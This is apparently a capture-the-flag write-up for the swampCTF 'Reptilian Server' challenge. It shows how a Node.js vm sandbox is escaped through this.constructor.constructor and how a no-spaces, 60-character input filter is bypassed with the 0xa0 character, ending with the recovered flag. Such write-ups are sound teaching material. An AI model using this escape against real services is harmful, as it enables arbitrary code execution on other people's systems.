"Reptilian Server"

For this challenge, we're presented with a target host and a `server.js` file:

           const vm = require('node:vm');  
           const net = require('net');

           // Get the port from the environment variable (default to 3000)  
           const PORT = process.env.PORT || 3000;

           // Create a TCP server  
           const server = net.createServer((sock) => {  
               console.log('Client connected!');  
               sock.write(`Welcome to the ReptilianRealm! Please wait while we setup the virtual environment.\n`);

               const box = vm.createContext(Object.create({  
                   console: {  
                       log: (output) => {  
                           sock.write(output + '\n');  
                       }  
                   },  
                   eval: (x) => eval(x)  
               }));

               sock.write(`Environment created, have fun playing with the environment!\n`);

               sock.on('data', (data) => {  
                   const c = data.toString().trim();

                   if (c.indexOf(' ') >= 0 || c.length > 60) {  
                       sock.write("Intruder Alert! Removing unwelcomed spy from centeralized computing center!");  
                       sock.end();  
                       return;  
                   }

                   try {  
                       const s = new vm.Script(c);  
                       s.runInContext(box, s);  
                   } catch (e) {  
                       sock.write(`Error executing command: ${e.message} \n`);  
                   }  
               });

               sock.on('end', () => { console.log('Client disconnected!'); });  
           });

           // Handle server errors  
           server.on('error', (e) => {  
               console.error('Server error:', e);  
           });

           // Start the server listening on correct port.  
           server.listen(PORT, () => {  
               console.log(`Server listening on port ${PORT}`);  
           });  

By looking through this source, we can see that it's using nodejs' native `vm`
package to sandbox the commands we send over the network.

However, it's extremely important to note that this is not a secure vm, as
stated on nodejs' official documentation.

The `vm` module simply separates the context of our new invoked code from the
`server.js` application's code, and doesn't prevent child code from accessing
parent constructors.

As such, we can escape the vm and run code in the `server.js` context by
calling into our vm's constructor:

           this.constructor.constructor("return SOMETHINGHERE")()  

Let's send the exploit with a test payload, dumping the vm's `process.argv`!

           Welcome to the ReptilianRealm! Please wait while we setup the virtual environment.  
           Environment created, have fun playing with the environment!

           c = this.constructor.constructor("return process.argv")  
           console.log(c())  

           Intruder Alert! Removing unwelcomed spy from centeralized computing center!  

Looks like we're missing something. As it turns out, there are two checks run
on the commands we send:

   Command length must be less than or equal to 60 characters.  
   Command must not contain spaces.

           ...  
           if (c.indexOf(' ') >= 0 || c.length > 60) {  
               sock.write("Intruder Alert! Removing unwelcomed spy from centeralized computing center!");  
               sock.end();  
               return;}  
           ...  

This is a problem for our exploit, since there's a space in the parent
constructor's argument. However, there are any number of characters that
nodejs will recognize as a space delimiter, one of which is `0xa0`. Let's try
embedding this character in place of regular spaces in our exploit, and as a
bonus, splitting up our payload into lines less than 60 characters.

           Welcome to the ReptilianRealm! Please wait while we setup the virtual environment.  
           Environment created, have fun playing with the environment!

           c=this.constructor.constructor  
           x="return\xa0process.argv"  
           console.log(c(x)())  
  
           /usr/local/bin/node,/server.js,server_max_limit=600,language=Reptilian,version=1.0.0,flag=swampCTF{Unic0d3_F0r_Th3_W1n},shutdown_condition=never

Awesome! There's our flag.  
**swampCTF{Unic0d3_F0r_Th3_W1n}  
**

Original writeup (https://nop.so/blog/ctf/0001).